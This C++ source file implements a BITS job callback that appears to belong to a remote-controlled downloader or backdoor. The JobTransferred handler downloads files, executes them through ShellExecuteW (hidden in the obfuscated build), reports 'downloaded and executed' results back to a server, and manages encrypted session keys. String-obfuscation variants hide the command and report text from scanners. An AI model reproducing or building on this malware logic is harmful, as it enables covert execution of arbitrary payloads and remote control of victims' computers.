#include "CNotifyInterface.h"

HRESULT CNotifyInterface::QueryInterface(REFIID riid,
                                         LPVOID* ppvObj) {
  if (riid == __uuidof(IUnknown) ||
      riid == __uuidof(IBackgroundCopyCallback)) {
    *ppvObj = this;
  } else {
    *ppvObj = NULL;
    return E_NOINTERFACE;
  }

  AddRef();
  return NOERROR;
}

ULONG CNotifyInterface::AddRef() {
  return InterlockedIncrement(&m_lRefCount);
}

ULONG CNotifyInterface::Release() {
  ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

  if(0 == ulCount) {
    delete this;
  }

  return ulCount;
}

HRESULT CNotifyInterface::JobTransferred
    (IBackgroundCopyJob* pJob) {
  HRESULT hr;
  GUID jobId;
  FILE *stream;
  std::wstring cmd, entry;
  u32 key[8];

  pJob->GetId(&jobId);

  hr = pJob->Complete();

  if (FAILED(hr)) {
    assert(SUCCEEDED(hr));
    //Handle error. BITS probably was unable to rename one or more of the temporary files. See the Remarks section of the IBackgroundCopyJob::Complete 
    //method for more details.
  } else {
    for (size_t i = 0; i < jobs.size(); i++) {
      if (jobs.at(i)->id != jobId) continue;
      switch (jobs.at(i)->action) {
        case kActionDownload:
#ifndef _STRING_PROTECTION
          cmd = S(L"GET");
          entry = S(L"downloaded to: ");
#else
          cmd = S(L"\x73\x6a\x65\x38");
          entry = S(L"\x50\x40\x46\x56\x6d\x39\x30\x3d\x51\x4b\x11\x4c\x6e\x6c\x71\x59");
#endif
          entry.append (jobs.at(i)->path);
          send_report(cmd, entry);
          break;
        case kActionRun:
#ifndef _STRING_PROTECTION
          cmd = S(L"DAE");
#else
          cmd = S(L"\x70\x6e\x74\x38");
#endif
          if (!_wfopen_s(&stream, jobs.at(i)->path.c_str(), L"r" )) {
            fclose(stream);
#ifndef _STRING_PROTECTION
            ShellExecuteW( NULL, S(L"open"), jobs.at(i)->path.c_str(), NULL, S(L" C:\\ "), SW_SHOWNORMAL);
            entry = S(L"downloaded and executed: ");
#else
            ShellExecuteW( NULL, S(L"\x5b\x5f\x54\x56\x01"), jobs.at(i)->path.c_str(), NULL, S(L"\x14\x6c\x0b\x64\x21\x56"), 0);
            entry = S(L"\x50\x40\x46\x56\x6d\x39\x30\x3d\x51\x4b\x11\x59\x6f\x32\x71\x3c\x4c\x4a\x52\x4d\x75\x33\x35\x63\x14\x2f");
#endif
          } else {
            //file doesn't exist!
#ifndef _STRING_PROTECTION
            entry = S(L"file not found after download: ");
#else
            entry = S(L"\x52\x46\x5d\x5d\x21\x38\x3e\x2d\x14\x49\x5e\x4d\x6f\x32\x71\x38\x52\x5b\x54\x4a\x21\x32\x3e\x2e\x5a\x43\x5e\x59\x65\x6c\x71\x59");
#endif
          }
          entry.append (jobs.at(i)->path);
          send_report(cmd, entry);
          break;
        case kActionSession:
          getKeySession(key);
          entry = readEncryptedFile(jobs.at(i)->path, key);
          memset(key, 0, 8);
          if (entry.length() == 39) {
            wcscpy_s( strSession, _countof( strSession ),
              getNextLine(entry).c_str() );
            schedule_action(kActionNoop);
          } else {
            request_new_session();
          }
          break;
        case kActionNoop:
        case kActionReport:
          noop_parse(jobs.at(i)->path.c_str());
          break;
        case kActionUpload:
          //DeleteFileW(jobs.at(i)->path.c_str());
          break;
      }
      delete jobs.at(i);
      jobs.erase(jobs.begin() + i);
      break;
    }
  }

  //If you do not return S_OK, BITS continues to call this callback.
  return S_OK;
}

HRESULT CNotifyInterface::JobError(IBackgroundCopyJob* pJob, IBackgroundCopyError* pError){
  HRESULT hr;
  BG_FILE_PROGRESS Progress;
  BG_ERROR_CONTEXT Context;
  HRESULT ErrorCode = S_OK;
  WCHAR* pszJobName = NULL;
  WCHAR* pszErrorDescription = NULL;
  IBackgroundCopyFile *pFile;
  BOOL IsError = TRUE;

  GUID jobId;

  pJob->GetId(&jobId);

  //Use pJob and pError to retrieve information of interest. For example, if the job is an upload reply, call the IBackgroundCopyError::GetError method to determine the context in which the job failed. If the context is BG_JOB_CONTEXT_REMOTE_APPLICATION, the server application that received the upload file failed.

  hr = pError->GetError(&Context, &ErrorCode);

  //If the proxy or server does not support the Content-Range header or if antivirus software removes the range requests, BITS returns BG_E_INSUFFICIENT_RANGE_SUPPORT. This implementation tries to switch the job to foreground priority, so the content has a better chance of being successfully downloaded.
  if (BG_E_INSUFFICIENT_RANGE_SUPPORT == ErrorCode)
  {
    hr = pError->GetFile(&pFile);
    hr = pFile->GetProgress(&Progress);
    if (BG_SIZE_UNKNOWN == Progress.BytesTotal)
    {
      //The content is dynamic, do not change priority. Handle as an error.
    }
    else if (Progress.BytesTotal > TWO_GB)
    {
      //BITS does not use range requests if the content is less than 2 GB. 
      //However, if the content is greater than 2 GB, BITS
      //uses 2 GB ranges to download the file, so switching to foreground 
      //priority will not help.
    }
    else
    {
      hr = pJob->SetPriority(BG_JOB_PRIORITY_FOREGROUND);
      hr = pJob->Resume();
      IsError = FALSE;
    }

    pFile->Release();
  }

  if (TRUE == IsError)
  {
    hr = pJob->GetDisplayName(&pszJobName);
    hr = pError->GetErrorDescription(LANGIDFROMLCID(GetThreadLocale()), &pszErrorDescription);

    if (pszJobName && pszErrorDescription)
    {
      //Do something with the job name and description. 
    }

    std::vector<com_bits_job *>::iterator it;
    for (it = jobs.begin(); it != jobs.end(); ++it) {
      if ( (*it)->id != jobId ) continue;
      switch ((*it)->action) {
        case kActionSession:
          SleepEx (60000, true);
          request_new_session();
          break;
        //TODO: report about the error to the server
      }
      delete (*it);
      jobs.erase(it);
      break;
    }

    CoTaskMemFree(pszJobName);
    CoTaskMemFree(pszErrorDescription);

    pJob->Cancel();
  }

  //If you do not return S_OK, BITS continues to call this callback.
  return S_OK;
}

HRESULT CNotifyInterface::JobModification(IBackgroundCopyJob* pJob, DWORD dwReserved)
{
  HRESULT hr;
  WCHAR* pszJobName = NULL;
  //BG_JOB_PROGRESS Progress;
  BG_JOB_STATE State;
  BG_ERROR_CONTEXT Context;
  IBackgroundCopyError* pError;
  HRESULT ErrorCode = S_OK;
  ULONG ErrorCount;

  hr = pJob->GetState(&State);
  if (SUCCEEDED(hr)) {
    if (State == BG_JOB_STATE_TRANSIENT_ERROR) {
      hr = pJob->GetError(&pError);
      if (SUCCEEDED(hr)) {
        hr = pError->GetError(&Context, &ErrorCode);
        if (SUCCEEDED(hr)) {
          switch (ErrorCode) {
            case BG_E_FILE_NOT_AVAILABLE:
            case BG_E_FILE_NOT_FOUND:
            case BG_E_HTTP_ERROR_404:
              pJob->Cancel();
              //TODO: report back
            case BG_E_CONNECTION_CLOSED:
            case BG_E_INVALID_SERVER_RESPONSE:
            case BG_E_HTTP_ERROR_500:
            default:
              hr = pJob->GetErrorCount(&ErrorCount);
              if (FAILED(hr)) {
                ErrorCount = 10;
              }
              if (ErrorCount >= 10) {
                pJob->Cancel();
              } else {
                SleepEx (10000, true);
                pJob->Resume();
              }
          }
        }
      }
      //TODO: kill stale jobs
    }
  }

  return S_OK;
}
